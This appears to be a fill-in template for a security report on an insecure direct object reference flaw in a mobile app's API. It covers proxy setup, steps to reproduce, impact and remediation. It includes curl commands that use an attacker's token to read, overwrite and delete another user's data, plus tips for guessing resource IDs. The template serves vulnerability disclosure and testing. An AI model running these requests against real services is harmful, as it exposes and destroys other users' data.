## Prerequisites
- Two test accounts on the target application
- HTTP proxy tool (Burp Suite, mitmproxy, or similar)
- Android device with proxy configured
- SSL pinning bypassed (if applicable)

## Steps to Reproduce

### 1. Set Up HTTP Proxy
```bash
# Configure device proxy to Burp/mitmproxy
adb shell settings put global http_proxy <proxy_ip>:8080

# Install proxy CA certificate on device
adb push burp-ca.der /sdcard/
# Settings → Security → Install from storage
```

### 2. Capture Authenticated Requests
```
1. Log in as User A (victim account)
2. Navigate to the feature related to {{ class_name }}
3. Observe API requests in the proxy — note the resource IDs and endpoints
4. Look for patterns like: /api/users/{user_id}/data, /api/orders/{order_id}
```

### 3. Test for IDOR
```
1. Log in as User B (attacker account)
2. Capture the same API request
3. Replace User B's resource ID with User A's resource ID
4. Forward the modified request
```

### 4. Automated Testing
```bash
# Use curl to test with different auth tokens
# Replace TOKEN_B with attacker's token, USER_A_ID with victim's ID

# Read access test
curl -H "Authorization: Bearer TOKEN_B" \
  "https://api.target.com/api/users/USER_A_ID/profile"

# Write access test
curl -X PUT -H "Authorization: Bearer TOKEN_B" \
  -H "Content-Type: application/json" \
  -d '{"name": "hacked"}' \
  "https://api.target.com/api/users/USER_A_ID/profile"

# Delete access test
curl -X DELETE -H "Authorization: Bearer TOKEN_B" \
  "https://api.target.com/api/users/USER_A_ID/data"
```

### 5. ID Pattern Analysis
```
Check for predictable IDs:
- Sequential integers: 1001, 1002, 1003
- UUID v1 (time-based): can be predicted
- Base64 encoded IDs: decode and modify
- GraphQL node IDs: decode relay-style IDs
```

## Expected Result
- User B can access/modify/delete User A's resources using User A's IDs
- The API does not verify that the authenticated user owns the requested resource
- Sensitive data from other users is returned in the response

## Impact
An attacker can access, modify, or delete any user's data by manipulating resource identifiers. This can lead to:
- Mass data exfiltration of all user records
- Unauthorized modification of user profiles, orders, or settings
- Privacy violations affecting all application users

## Remediation
{{ remediation or "1. Implement server-side authorization checks that verify the authenticated user owns the requested resource\n2. Use indirect object references (mapping user-specific tokens to server-side IDs)\n3. Avoid exposing sequential or predictable resource IDs\n4. Implement rate limiting on API endpoints\n5. Add access control unit tests for every endpoint" }}
